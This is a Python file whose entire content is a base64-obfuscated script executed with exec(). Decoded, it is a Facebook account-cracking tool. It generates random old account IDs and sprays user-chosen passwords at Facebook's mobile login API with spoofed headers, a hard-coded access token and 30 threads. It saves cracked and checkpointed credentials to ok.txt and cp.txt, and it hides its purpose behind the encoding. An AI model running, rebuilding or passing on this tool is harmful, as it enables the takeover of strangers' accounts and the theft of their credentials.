# #ENCODE_BY_LTKYAW


import base64
exec(base64.b64decode('aW1wb3J0IG9zCnRyeToKCWltcG9ydCByZXF1ZXN0cwpleGNlcHQgSW1wb3J0RXJyb3I6CglwcmludCgiXG4gWyFdIFwwMzNbMDs5MW1tb2R1bGUgcmVxdWVzdHMgYmVsdW0gdGVyaW5zdGFsbCBcMDMzWzA7OTdtIikKCW9zLnN5c3RlbSgicGlwIGluc3RhbGwgcmVxdWVzdHMiKQoKdHJ5OgoJaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlcwpleGNlcHQgSW1wb3J0RXJyb3I6CglwcmludCgiXG4gWyFdIFwwMzNbMDs5MW1tb2R1bGUgZnV0dXJlcyBiZWx1bSB0ZXJpbnN0YWxsXDAzM1swOzk3bSIpCglvcy5zeXN0ZW0oInBpcCBpbnN0YWxsIGZ1dHVyZXMiKQoKaW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCByYW5kb20KZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvcgoKY2xhc3MgTWFpbjoKCWRlZiBfX2luaXRfXyhzZWxmKToKCQlzZWxmLmlkID0gW10KCQlzZWxmLm9rID0gW10KCQlzZWxmLmNwID0gW10KCQlzZWxmLmxvb3AgPSAwCgoJCW9zLnN5c3RlbSgiY2xlYXIiKQoJCW9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9hcmFrYW5lc2UuMDAzJykKCQlwcmludCgiICIpCgkJcHJpbnQoIiAiKQoJCXByaW50KCIgICAgXDAzM1sxOzMybSAgICBfX19fX19fX19fICBfX18gICBfX19fX19fXyBfXyAgICBfX19fICBfXyAgICBfX19fIFxuICAgICAgIC8gX19fXy8gX18gXC8gICB8IC8gX19fXy8gLy9fLyAgIC8gX18gXC8gLyAgIC8gX18gXCBcbiAgICAgXDAzM1sxOzM2bSAvIC8gICAvIC9fLyAvIC98IHwvIC8gICAvICw8ICAgICAvIC8gLyAvIC8gICAvIC8gLyAvXG4gICAgIFwwMzNbMTszNW0vIC9fX18vIF8sIF8vIF9fXyAvIC9fX18vIC98IHwgICAvIC9fLyAvIC9fX18vIC9fLyAvIFxuICAgICBcMDMzWzE7MzNtXF9fX18vXy8gfF8vXy8gIHxfXF9fX18vXy8gfF98ICAgXF9fX18vX19fX18vX19fX18vIikKCQlwcmludCgiICAgIFwwMzNbMDs5Mm0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iKQoJCXByaW50KCIgICAgXDAzM1swOzkybVvwn5G9XSBBVVRIT1IgICAgIDogIPCfjJ8rTFRLWUFXK/CfjJ8iKSAKCQlwcmludCgiICAgIFwwMzNbMDs5Mm1b8J+RvV0gRkFDRUJPT0sgICA6ICBtLmZiLmNvbS9hcmFrYW5lc2UuMDAzIikgCgkJcHJpbnQoIiAgICBcMDMzWzA7OTJtW/Cfkb1dIFRPT0wgTkFNRSAgOiAgQ1JBQ0sgT0xEID4gMjAwOSIpIAoJCXByaW50KCIgICAgXDAzM1swOzkybS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpCgkJcHJpbnQoIlxuICAgIFwwMzNbMDs5Mm0gICAgICAgICAgIHsq8J+YjUdPT0RMVUNL8J+YjSp9IFwwMzNbMDs5N20gIikKCQlwcmludCgiXG4gICAgXDAzM1swOzkybVtBXVwwMzNbMTszM20gQ1JBQ0sgUkFORE9NIEFDT1VOVCAyMDA5IFwwMzNbMDs5N20gIikKCQl0YW55YSA9IGlucHV0KCIgICAgXDAzM1sxOzM2bSgjKVwwMzNbMTszM20gQ0hPT1NFIDogIikKCQlpZiB0YW55YSBpbiBbIiIsICIgIl06CgkJCU1haW4oKQoJCWVsaWYgdGFueWEgaW4gWyJBIiwgImEiXToKCQkJc2VsZi5mYnR1YSgpCgkJZWxzZToKCQkJTWFpbigpCgoJZGVmIGZidHVhKHNlbGYpOgoJCXggPSAxMTExMTExMTEKCQl4eCA9IDk5OTk5OTk5OQoJCWlkeCA9ICIxMDAwMDAiIAoJCWxpbWl0ID0gaW50KGlucHV0KCIgICAgXDAzM1sxOzM2bVsrXVwwMzNbMTszM20gVE9UQUwgSURTIFRPIENSQUNLIFwwMzNbMTszMm0oTElNSVQgOiA1MDAwKSA+ICIpKQoJCXRyeToKCQkJZm9yIG4gaW4gcmFuZ2UobGltaXQpOgoJCQkJXyA9IHJhbmRvbS5yYW5kaW50KHgseHgpCgkJCQlfXyA9IGlkeAoJCQkJc2VsZi5pZC5hcHBlbmQoX18rc3RyKF8pKQoJCQlwcmludCgiICAgIFwwMzNbMTszNm1bK11cMDMzWzE7MzJtIFRPVEFMIElEID4gXDAzM1sxOzMybSVzXDAzM1sxOzMybSIlKGxlbihzZWxmLmlkKSkpIAoJCQl3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgY29lZzoKCQkJCXByaW50KCJcbiAgICBcMDMzWzE7MzZtWyFdXDAzM1sxOzMzbSBDSE9PU0UgQU5ZIFBBU1NXQVJEIEVYQU1QTEUgOiAxMjM0NTYsMTIzNDU2NzgiKQoJCQkJbGlzdHBhc3MgPSBpbnB1dCgiICAgIFwwMzNbMTszNm1bP11cMDMzWzE7MzNtIFBBU1NXQVJEIFlPVSBDSE9PU0UgOiAiKQoJCQkJaWYgbGVuKGxpc3RwYXNzKTw9NToKCQkJCQlleGl0KCJcbiAgICBcMDMzWzE7MzZtWyFdXDAzM1sxOzMzbSBQQVNTIE1VU1QgQkUgNiBESUdJVFMiKQoJCQkJcHJpbnQoIiAgICBcMDMzWzE7MzZtWypdXDAzM1sxOzMzbSBZT1VSIENIT09TRSBQQVNTV0FSRCA+IFtcMDMzWzE7MzJtJXNcMDMzWzE7MzNtXSIlKGxpc3RwYXNzKSkKCQkJCXByaW50KCJcbiAgICBcMDMzWzE7MzZtWytdXDAzM1sxOzMzbSBBQ09VTlQgT0sgU0FWRSAgb2sudHh0IikKCQkJCXByaW50KCIgICAgXDAzM1sxOzM2bVsrXVwwMzNbMTszM20gQUNPVU5UIENQIFNBVkUgIGNwLnR4dCIpCgkJCQlwcmludCgiICAgIFwwMzNbMTszNm1bIV1cMDMzWzE7MzNtIFRVUk4gT04gQUlSUExBTkUgTU9ERSBGT1IgKDUgU2VjIClcbiIpCgkJCQlmb3IgdXNlciBpbiBzZWxmLmlkOgoJCQkJCWNvZWcuc3VibWl0KHNlbGYuYXBpLCB1c2VyLCBsaXN0cGFzcy5zcGxpdCgiLCIpKQoJCQlleGl0KCJcblxuICAgIFsjXSBDUkFDSyBET05FLi4uIikKCQlleGNlcHQgRXhjZXB0aW9uIGFzIGU6ZXhpdChzdHIoZSkpCgoJZGVmIGFwaShzZWxmLCB1aWQsIHB3eCk6CgkJdWEgPSByYW5kb20uY2hvaWNlKFsKCQkJIkRhbHZpay8xLjYuMCAoTGludXg7IFU7IEFuZHJvaWQgNC40LjI7IE5YNTUgQnVpbGQvS09UNTUwNikgW0ZCQU4vRkI0QTtGQkFWLzEwNi4wLjAuMjYuNjg7RkJCVi80NTkwNDE2MDtGQkRNL3tkZW5zaXR5PTMuMCx3aWR0aD0xMDgwLGhlaWdodD0xOTIwfTtGQkxDL2l0X0lUO0ZCUlYvNDU5MDQxNjA7RkJDUi9Qb3N0ZU1vYmlsZTtGQk1GL2FzdXM7RkJCRC9hc3VzO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL0FTVVNfWjAwNztGQlNWLzUuMDtGQk9QLzE7RkJDQS94ODY6YXJtZWFiaS12N2E7XSIsIAoJCQkiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10iCgkJXSkKCQlzeXMuc3Rkb3V0LndyaXRlKAoJCQkiXHIgICAgXDAzM1sxOzM2bVsjXSBTVEFSVC1DUkFDSyA6ICVzLyVzIE9LOi0lcyAgQ1A6LSVzICIlKHNlbGYubG9vcCwgbGVuKHNlbGYuaWQpLCBsZW4oc2VsZi5vayksIGxlbihzZWxmLmNwKSkKCQkpOyBzeXMuc3Rkb3V0LmZsdXNoKCkKCQlmb3IgcHcgaW4gcHd4OgoJCQlwdyA9IHB3Lmxvd2VyKCkKCQkJc2VzID0gcmVxdWVzdHMuU2Vzc2lvbigpCgkJCWhlYWRlcnMgPSB7CgkJCQkieC1mYi1jb25uZWN0aW9uLWJhbmR3aWR0aCI6IHN0cihyYW5kb20ucmFuZGludCgyMDAwMDAwMC4wLCAzMDAwMDAwMC4wKSksIAoJCQkJIngtZmItc2ltLWhuaSI6IHN0cihyYW5kb20ucmFuZGludCgyMDAwMCwgNDAwMDApKSwgCgkJCQkieC1mYi1uZXQtaG5pIjogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwLCA0MDAwMCkpLCAKCQkJCSJ4LWZiLWNvbm5lY3Rpb24tcXVhbGl0eSI6ICJFWENFTExFTlQiLAoJCQkJIngtZmItY29ubmVjdGlvbi10eXBlIjogImNlbGwuQ1RSYWRpb0FjY2Vzc1RlY2hub2xvZ3lIU0RQQSIsCgkJCQkidXNlci1hZ2VudCI6IHVhLCAKCQkJCSJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwgCgkJCQkieC1mYi1odHRwLWVuZ2luZSI6ICJMaWdlciIKCQkJfQoJCQlyZXNwb25zZSA9IHNlcy5nZXQoImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2Zvcm1hdD1qc29uJmVtYWlsPSIrc3RyKHVpZCkrIiZwYXNzd29yZD0iK3N0cihwdykrIiZjcmVkZW50aWFsc190eXBlPWRldmljZV9iYXNlZF9sb2dpbl9wYXNzd29yZCZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZlcnJvcl9kZXRhaWxfdHlwZT1idXR0b25fd2l0aF9kaXNhYmxlZCZzb3VyY2U9ZGV2aWNlX2Jhc2VkX2xvZ2luJm1ldGFfaW5mX2ZibWV0YT0lMjAmY3VycmVudGx5X2xvZ2dlZF9pbl91c2VyaWQ9MCZtZXRob2Q9R0VUJmxvY2FsZT1lbl9VUyZjbGllbnRfY291bnRyeV9jb2RlPVVTJmZiX2FwaV9jYWxsZXJfY2xhc3M9Y29tLmZhY2Vib29rLmZvcy5oZWFkZXJzdjIuZmI0YW9yY2EuSGVhZGVyc1YyQ29uZmlnRmV0Y2hSZXF1ZXN0SGFuZGxlciZhY2Nlc3NfdG9rZW49MzUwNjg1NTMxNzI4fDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJmZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZT1hdXRoZW50aWNhdGUmY3BsPXRydWUiLCBoZWFkZXJzPWhlYWRlcnMpIAoJCQlpZiAic2Vzc2lvbl9rZXkiIGluIHJlc3BvbnNlLnRleHQgYW5kICJFQUFBIiBpbiByZXNwb25zZS50ZXh0OgoJCQkJcHJpbnQoIlxyICBcMDMzWzE7MzJtICAgW09LXSAlcyB8ICVzXDAzM1sxOzMybSAgICAgICAgICIlKHVpZCwgcHcpKQoJCQkJc2VsZi5vay5hcHBlbmQoIiVzfCVzIiUodWlkLCBwdykpCgkJCQlvcGVuKCJvay50eHQiLCJhIikud3JpdGUoIiAgKiAtLT4gJXN8JXNcbiIlKHVpZCwgcHcpKQoJCQkJYnJlYWsKCQkJZWxpZiAid3d3LmZhY2Vib29rLmNvbSIgaW4gcmVzcG9uc2UuanNvbigpWyJlcnJvcl9tc2ciXToKCQkJCXByaW50KCJcciAgXDAzM1sxOzM2bSAgIFtDUF0gJXMgfCAlc1wwMzNbMTszNm0gICAgICAgICAiJSh1aWQsIHB3KSkKCQkJCXNlbGYuY3AuYXBwZW5kKCIlc3wlcyIlKHVpZCwgcHcpKQoJCQkJb3BlbigiY3AudHh0IiwiYSIpLndyaXRlKCIgICogLS0+ICVzfCVzXG4iJSh1aWQsIHB3KSkKCQkJCWJyZWFrCgkJCWVsc2U6CgkJCQljb250aW51ZQoKCQlzZWxmLmxvb3AgKz0xCgppZiBsZW4oc3lzLmFyZ3YpID09IDI6CglpZiBzeXMuYXJndlsxXSA9PSAiLS1pbmZvIjoKCQlwcmludCgiICAgX19fX19fX19fX19fX19fX19fXyAgICAgICAgXG4gIC8gIF9fX19fL1xfICAgX19fX18vICAgICAgICBcbiAvICAgXCAgX19fIHwgICAgX18pICAgICAgICAgIFxuIFwgICAgXF9cICBcfCAgICAgXCBcMDMzWzA7OTZtR0FMQVhZXDAzM1swOzk3bSAgICAgICAgXG4gIFxfX19fX18gIC9cX19fICAvX19cMDMzWzA7OTZtRkFDRUJPT0tcMDMzWzA7OTdtX1xuICAgICAgICAgXC8gICAgIFwvX19fX18vX19fX18vIikKCQlwcmludCgiXG4gWypdIEF1dGhvciAgICA6ICAiKQoJCXByaW50KCIgWypdIFRlYW0gICAgICA6ICBcbiIpCgkJcHJpbnQoIiBbIFNvc2lhbCBNZWRpICBdIFxuIikKCQlwcmludCgiIFsqXSBGYWNlYm9vayAgOiBodHRwczovL2ZhY2Vib29rLmNvbS8gIikKCQlwcmludCgiIFsqXSBJbnN0YWdyYW0gOiBodHRwczovL2luc3RhZ3JhbS5jb20vICIpCgkJcHJpbnQoIiBbKl0gWW91VHViZSAgIDogaHR0cHM6Ly95b3V0dWJlLmNvbS8gIikKCQlleGl0KCIgWypdIEdpdEh1YiAgICA6IGh0dHBzOi8vZ2l0aHViLmNvbS8gIikKCWVsc2U6CgkJTWFpbigpCgp0cnk6TWFpbigpCmV4Y2VwdCBFeGNlcHRpb24gYXMgZTpleGl0KHN0cihlKSkKCg=='))
